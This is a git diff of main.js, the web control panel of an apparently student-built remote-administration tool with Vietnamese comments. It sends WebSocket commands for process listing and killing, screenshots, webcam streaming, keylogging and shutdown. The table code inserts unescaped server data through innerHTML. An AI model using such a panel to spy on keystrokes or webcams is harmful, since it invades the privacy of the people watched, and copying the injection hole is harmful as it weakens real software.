@@ -1,269 +1,185 @@
 /**
- * main.js - Logic điều khiển cho Web Client
- * Đảm nhiệm việc kết nối WebSocket, gửi lệnh và cập nhật giao diện
+ * main.js - Client logic cập nhật Restart & Webcam
  */
 
 let ws;
-let isWebcamOn = false;
+let keylogInterval = null;
+let isWebcamStreaming = false; // Biến trạng thái Webcam
 
-// --- 1. KHỞI TẠO KẾT NỐI WEBSOCKET ---
-// Hàm này sẽ được gọi từ file HTML sau khi đã có GATEWAY_URL
 function initWebSocket(gatewayUrl) {
-    console.log("Đang kết nối tới:", gatewayUrl);
-    logStatus("Đang kết nối tới Gateway...");
-    
+    logStatus("Đang kết nối Gateway...");
     ws = new WebSocket(gatewayUrl);
 
-    ws.onopen = function() {
-        logStatus("Đã kết nối thành công!");
-        console.log("WebSocket Connected");
-        
-        // Đăng ký danh tính với Gateway: Tôi là Web Client
-        // Gateway sẽ dùng role này để định tuyến tin nhắn
-        ws.send(JSON.stringify({
-            type: "register",
-            role: "web_client"
-        }));
+    ws.onopen = () => {
+        logStatus("Đã kết nối!");
+        ws.send(JSON.stringify({ type: "register", role: "web_client" }));
     };
 
-    ws.onmessage = function(event) {
+    ws.onmessage = (event) => {
         try {
             const msg = JSON.parse(event.data);
             handleServerMessage(msg);
         } catch (e) {
-            console.error("Lỗi đọc dữ liệu JSON:", e);
-            logStatus("Lỗi: Nhận dữ liệu không hợp lệ.");
+            console.log("Raw msg:", event.data);
         }
     };
 
-    ws.onclose = function() {
-        logStatus("Mất kết nối! Vui lòng tải lại trang.");
-        alert("Đã mất kết nối tới Server Gateway.");
-    };
-
-    ws.onerror = function(error) {
-        console.error("WebSocket Error:", error);
-        logStatus("Lỗi kết nối Socket.");
+    ws.onclose = () => {
+        logStatus("Mất kết nối Gateway.");
+        if (keylogInterval) clearInterval(keylogInterval);
     };
 }
 
-// --- 2. XỬ LÝ DỮ LIỆU NHẬN ĐƯỢC ---
-function handleServerMessage(msg) {
-    // msg = { type: "...", data: "..." }
-    
-    switch (msg.type) {
-        case 'LIST_APPS':
-        case 'LIST_PROCESS':
-            // Xử lý dữ liệu danh sách processes/apps
-            // msg.data mong đợi là mảng: [{pid: 123, name: "notepad.exe"}, ...]
-            renderTable(msg.data); 
-            // Tự động chuyển view sang bảng
-            switchView('view-table', msg.type === 'LIST_APPS' ? 'Danh sách Ứng dụng' : 'Danh sách Tiến trình');
-            break;
-
-        case 'IMAGE_DATA':
-            // Xử lý ảnh (Screenshot hoặc Webcam)
-            // msg.data là chuỗi Base64
-            const img = document.getElementById('monitor-img');
-            if (img) {
-                img.src = "data:image/jpeg;base64," + msg.data;
-            }
-            break;
-
-        case 'KEY_DATA':
-            // Xử lý Keylogger
-            // msg.data là ký tự phím bấm
-            const textArea = document.getElementById('keylog-area');
-            if (textArea) {
-                textArea.value += msg.data;
-                // Tự động cuộn xuống dòng cuối cùng
-                textArea.scrollTop = textArea.scrollHeight; 
-            }
-            break;
-        
-        case 'RESPONSE':
-            // Tin nhắn phản hồi chung (ví dụ: "Command executed")
-            logStatus("Server: " + msg.data);
-            break;
-            
-        case 'ERROR':
-            logStatus("Lỗi từ Server: " + msg.data);
-            break;
-            
-        default:
-            console.log("Tin nhắn không xác định:", msg);
-    }
-}
-
-// --- 3. GỬI LỆNH ĐI (FUNCTIONS) ---
-
-// Hàm gửi dữ liệu chung qua WebSocket
-function sendToGateway(payload) {
+function sendRequest(endpoint, params = {}) {
     if (ws && ws.readyState === WebSocket.OPEN) {
-        // QUAN TRỌNG: Luôn gắn target là 'cpp_server' để Gateway biết chuyển cho ai
-        payload.target = "cpp_server";
-        
-        ws.send(JSON.stringify(payload));
-        console.log("Đã gửi:", payload);
+        ws.send(JSON.stringify({ endpoint, params }));
     } else {
-        alert("Chưa kết nối tới Gateway! Vui lòng kiểm tra lại.");
+        alert("Gateway chưa kết nối!");
     }
 }
 
-// Nút 1 & 2: Yêu cầu danh sách
-function requestList(type) {
-    logStatus("Đang tải danh sách...");
-    sendToGateway({ action: type });
+// --- APP & PROCESS ---
+function listApps() {
+    logStatus("Đang tải danh sách App...");
+    sendRequest('/application/list');
 }
-
-// Nút: Start App (Gọi từ ô input)
 function startApp() {
-    const appInput = document.getElementById('app-path');
-    const appName = appInput.value.trim();
-    
-    if (appName) {
-        sendToGateway({ action: 'EXECUTE', path: appName });
-        logStatus("Đã gửi lệnh mở: " + appName);
-        appInput.value = ''; // Xóa ô nhập sau khi gửi
-    } else {
-        alert("Vui lòng nhập tên ứng dụng hoặc đường dẫn!");
+    const name = document.getElementById('app-path').value;
+    if (name) sendRequest('/application/start', { processName: name });
+}
+function killApp(id) {
+    if (confirm("Tắt App ID " + id + "?")) {
+        sendRequest('/application/kill', { processId: String(id) });
+        setTimeout(listApps, 1000);
     }
 }
 
-// Nút: Kill Process (Gọi từ nút trong bảng)
-function killProcess(target, type = 'PID') {
-    // type có thể là 'PID' hoặc 'NAME'
-    let actionCmd = (type === 'PID') ? 'KILL_BY_PID' : 'KILL_BY_NAME';
-    
-    // Hỏi xác nhận
-    if (!confirm(`Bạn muốn tắt ${type}: ${target}?`)) return;
-
-    // Gửi lệnh
-    sendToGateway({ 
-        action: actionCmd, 
-        value: target // target là số PID hoặc chuỗi tên "chrome.exe"
-    });
+function listProcesses() {
+    logStatus("Đang tải danh sách Process...");
+    sendRequest('/process/list');
+}
+function startProcess() {
+    const name = document.getElementById('app-path').value;
+    if (name) sendRequest('/process/start', { processName: name });
+}
+function killProcess(id) {
+    if (confirm("Tắt Process ID " + id + "?")) {
+        sendRequest('/process/kill', { processId: String(id) });
+        setTimeout(listProcesses, 1000);
+    }
 }
 
-// Nút 3: Screenshot
+// --- MEDIA (SCREENSHOT & WEBCAM) ---
 function requestScreenshot() {
-    switchView('view-media', 'Ảnh chụp màn hình');
-    sendToGateway({ action: 'SCREENSHOT' });
-    logStatus("Đang yêu cầu chụp màn hình...");
+    // Nếu webcam đang chạy thì tắt nó đi trước
+    if (isWebcamStreaming) toggleWebcam();
+    
+    switchView('view-media', 'Ảnh màn hình');
+    sendRequest('/screenshot/take');
+    logStatus("Đang chụp màn hình...");
 }
 
-// Nút 4: Webcam Toggle
 function toggleWebcam() {
+    switchView('view-media', 'Webcam Stream');
     const btn = document.getElementById('btn-webcam');
-    switchView('view-media', 'Webcam Trực tiếp');
     
-    if (!isWebcamOn) {
-        // Bật Webcam
-        isWebcamOn = true;
+    if (!isWebcamStreaming) {
+        // Bật
+        sendRequest('/webcam/start');
+        isWebcamStreaming = true;
         btn.innerText = "4. Tắt Webcam";
-        btn.classList.remove('btn-info');
-        btn.classList.add('btn-warning');
-        
-        sendToGateway({ action: 'WEBCAM_START' });
+        btn.classList.replace('btn-warning', 'btn-danger'); // Đổi màu đỏ
         logStatus("Đang bật Webcam...");
     } else {
-        // Tắt Webcam
-        isWebcamOn = false;
+        // Tắt
+        sendRequest('/webcam/stop');
+        isWebcamStreaming = false;
         btn.innerText = "4. Bật Webcam";
-        btn.classList.remove('btn-warning');
-        btn.classList.add('btn-info');
+        btn.classList.replace('btn-danger', 'btn-warning'); // Trả màu vàng
+        logStatus("Đã tắt Webcam.");
         
-        sendToGateway({ action: 'WEBCAM_STOP' });
-        logStatus("Đã gửi lệnh tắt Webcam.");
+        // Gửi thêm QUIT để thoát ngữ cảnh Webcam hoàn toàn
+        setTimeout(() => sendRequest('/webcam/quit'), 500);
     }
 }
 
-// Nút 5: Keylog
+// --- KEYLOGGER ---
 function startKeylog() {
-    switchView('view-keylog', 'Nhật ký bàn phím (Keylogger)');
-    sendToGateway({ action: 'START_KEYLOG' });
-    logStatus("Đang lắng nghe bàn phím...");
+    switchView('view-keylog', 'Keylogger');
+    sendRequest('/keylog/start');
+    if (keylogInterval) clearInterval(keylogInterval);
+    keylogInterval = setInterval(() => sendRequest('/keylog/print'), 2000);
+}
+function stopKeylog() {
+    if (keylogInterval) clearInterval(keylogInterval);
+    sendRequest('/keylog/stop');
+    // Gửi QUIT sau khi stop
+    setTimeout(() => sendRequest('/keylog/quit'), 500);
 }
 
-// Nút 6 & 7: Restart / Shutdown
-function confirmAction(action) {
-    const actionMap = { 
-        'RESTART': 'Khởi động lại', 
-        'SHUTDOWN': 'Tắt nguồn' 
-    };
-    
-    const message = `CẢNH BÁO NGUY HIỂM:\nBạn có chắc chắn muốn ${actionMap[action]} máy trạm không?\nHành động này sẽ làm mất kết nối ngay lập tức.`;
-    
-    if (confirm(message)) {
-        sendToGateway({ action: action });
-        logStatus(`Đã gửi lệnh ${action}... Tạm biệt!`);
+// --- SYSTEM ---
+function shutdownMachine() {
+    if (confirm("NGUY HIỂM: Tắt máy trạm?")) {
+        sendRequest('/shutdown');
+        logStatus("Lệnh tắt máy đã được gửi.");
+    }
+}
+function restartMachine() {
+    if (confirm("NGUY HIỂM: Khởi động lại máy trạm?")) {
+        sendRequest('/restart');
+        logStatus("Lệnh khởi động lại đã được gửi.");
     }
 }
 
-// --- 4. CÁC HÀM HỖ TRỢ GIAO DIỆN (UI HELPERS) ---
-
-// Chuyển đổi tab hiển thị (Table, Media, Text)
-function switchView(viewId, title) {
-    // Ẩn tất cả các view-section
-    const sections = document.querySelectorAll('.view-section');
-    sections.forEach(el => el.classList.remove('active'));
-    
-    // Hiện view được chọn
-    const selected = document.getElementById(viewId);
-    if (selected) selected.classList.add('active');
-    
-    // Cập nhật tiêu đề
-    const titleEl = document.getElementById('view-title');
-    if (titleEl) titleEl.innerText = title;
-}
-
-// Vẽ bảng HTML từ dữ liệu JSON
-function renderTable(dataArray) {
-    const tbody = document.getElementById('table-body');
-    if (!tbody) return;
-    
-    tbody.innerHTML = ""; // Xóa dữ liệu cũ
-
-    if (!Array.isArray(dataArray) || dataArray.length === 0) {
-        tbody.innerHTML = "<tr><td colspan='3' style='text-align:center'>Không có dữ liệu hoặc danh sách trống</td></tr>";
+// --- XỬ LÝ PHẢN HỒI ---
+function handleServerMessage(msg) {
+    // Dùng chung logic hiển thị ảnh cho cả Screenshot và Webcam
+    if (msg.type === "IMAGE_DATA" || (typeof msg.data === 'string' && msg.data.length > 1000)) {
+        const img = document.getElementById('monitor-img');
+        const src = msg.data.startsWith('data:') ? msg.data : "data:image/jpeg;base64," + msg.data;
+        img.src = src;
         return;
     }
 
-    dataArray.forEach(item => {
-        // Tạo dòng tr
+    const currentView = document.querySelector('.view-section.active').id;
+    if (currentView === 'view-table') renderTable(msg.data);
+    
+    if (currentView === 'view-keylog' && typeof msg.data === 'string') {
+        const area = document.getElementById('keylog-area');
+        area.value += msg.data;
+        area.scrollTop = area.scrollHeight;
+    }
+    
+    if (msg.data && typeof msg.data === 'string' && msg.data.length < 500) {
+        logStatus("Server: " + msg.data);
+    }
+}
+
+// --- UI HELPERS ---
+function switchView(viewId, title) {
+    document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active'));
+    document.getElementById(viewId).classList.add('active');
+    document.getElementById('view-title').innerText = title;
+}
+
+function renderTable(data) {
+    const tbody = document.getElementById('table-body');
+    tbody.innerHTML = "";
+    let list = data;
+    if (typeof data === 'string') { try { list = JSON.parse(data); } catch { return; } }
+    if (!Array.isArray(list)) return;
+
+    const isAppMode = document.getElementById('view-title').innerText.includes('Ứng dụng');
+    list.forEach(item => {
         const tr = document.createElement('tr');
-        
-        // Giả sử item = { pid: 1234, name: "chrome.exe" }
-        // Cột ID
-        const tdId = document.createElement('td');
-        tdId.textContent = item.pid || "N/A";
-        
-        // Cột Tên
-        const tdName = document.createElement('td');
-        tdName.textContent = item.name || "Unknown";
-        
-        // Cột Hành động (Nút Kill)
-        const tdAction = document.createElement('td');
-        const btnKill = document.createElement('button');
-        btnKill.className = 'btn-kill';
-        btnKill.textContent = 'Stop/Kill';
-        btnKill.onclick = function() { killProcess(item.pid); };
-        
-        tdAction.appendChild(btnKill);
-        
-        tr.appendChild(tdId);
-        tr.appendChild(tdName);
-        tr.appendChild(tdAction);
-        
+        const id = item.processId || item.id || "N/A";
+        const name = item.processName || item.name || "Unknown";
+        const killFn = isAppMode ? `killApp('${id}')` : `killProcess('${id}')`;
+        tr.innerHTML = `<td>${id}</td><td>${name}</td><td><button class="btn-kill" onclick="${killFn}">Kill</button></td>`;
         tbody.appendChild(tr);
     });
 }
 
-// Hàm ghi log trạng thái nhỏ ở góc dưới menu
 function logStatus(text) {
-    const el = document.getElementById('status-log');
-    if (el) {
-        const time = new Date().toLocaleTimeString();
-        el.innerText = `[${time}] ${text}`;
-    }
+    document.getElementById('status-log').innerText = `[${new Date().toLocaleTimeString()}] ${text}`;
 }
